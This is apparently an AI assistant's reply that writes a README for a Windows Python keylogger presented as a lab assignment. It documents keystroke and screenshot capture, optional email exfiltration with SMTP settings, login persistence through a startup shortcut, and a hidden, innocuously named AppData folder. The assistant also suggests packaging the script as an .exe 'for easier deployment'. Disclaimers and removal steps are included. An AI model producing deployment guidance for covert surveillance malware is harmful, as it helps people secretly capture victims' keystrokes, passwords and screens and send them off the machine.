

Of course. Based on our analysis, here is a revised and much more complete README file. You can copy and paste this directly into your `README.md` file.

---

# Keylogger Assignment

## Description
This project is a keylogger script designed to run on Windows systems. It captures keystrokes and takes screenshots at random intervals, saving them to a local file. It includes a **disabled-by-default** option to exfiltrate data via email and persistence mechanisms to start automatically on Windows login. This is intended for educational and controlled lab environments only.

## Requirements
- Python 3.0 or higher
- pynput
- pyautogui
- pywin32 (for Windows API access: win32gui, win32con, win32com.client)
- smtplib (standard Python library)
- email (standard Python library)
- Windows operating system (tested on Windows 10/11)
- Ensure you run this in an isolated lab environment for ethical and legal reasons

## Setup and Configuration

### 1. Installation
To install the necessary Python packages, run the following command in your terminal or Command Prompt:

```bash
pip install pynput pyautogui pywin32
```

### 2. Configuration
**To enable email exfiltration**, you must perform two steps:

1.  **Uncomment the `send_email` function call** in the main loop of `keylogger.py` (remove the `#` from the beginning of the line).
2.  Configure your email credentials and SMTP settings in the script:

```python
EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_email_password'
RECIPIENT_EMAIL = 'recipient_email@example.com'
SMTP_SERVER = 'smtp.example.com'
SMTP_PORT = 587
```

### 3. Execution
Run the script on a Windows machine with Python installed:

```bash
python keylogger.py
```

> **Note:** You can also convert this `.py` file to a standalone `.exe` using tools like PyInstaller for easier deployment.

## Output Location

The script saves its output to two files:
- `keylogs.txt`: Contains the logged keystrokes.
- `screenshot.png`: The latest screenshot taken.

These files will be saved in the **Current Working Directory** of the script.
- If you run the script manually, the files will be in the same folder as your `.py` file.
- If the script is run from the startup shortcut (its default behavior), the files will be saved in a hidden folder at: `C:\Users\<YourUsername>\AppData\Roaming\wpdnse\`

## Stopping and Removing the Script

To completely stop and remove the keylogger from your system, follow these steps:

1.  **Stop the Process:** Open Task Manager (`Ctrl + Shift + Esc`), go to the "Details" tab, and end any `python.exe` or `pythonw.exe` processes associated with the script.
2.  **Remove from Startup:** Press `Win + R`, type `shell:startup`, and press Enter. Delete the `keylogger.lnk` shortcut.
3.  **Delete Hidden Files:** Press `Win + R`, type `%APPDATA%`, and press Enter. Enable "Hidden items" in the View tab, find and delete the `wpdnse` folder.
4.  **Delete Original Files:** Delete the original `keylogger.py` script and any output files from the location where you first ran it.

## Important Notes

- This script is designed specifically for Windows and will not work on Linux or macOS without modifications.
- Running keyloggers may violate privacy laws and ethical guidelines. Use this script only in controlled environments where you have explicit permission.
- Antivirus software may detect this script as malicious due to its behavior.
- Always test in isolated virtual machines or lab setups.
- Make sure to secure and handle any collected data responsibly.

## Disclaimer
This project is for educational and research purposes only. The author is not responsible for any misuse or illegal activities conducted with this tool.
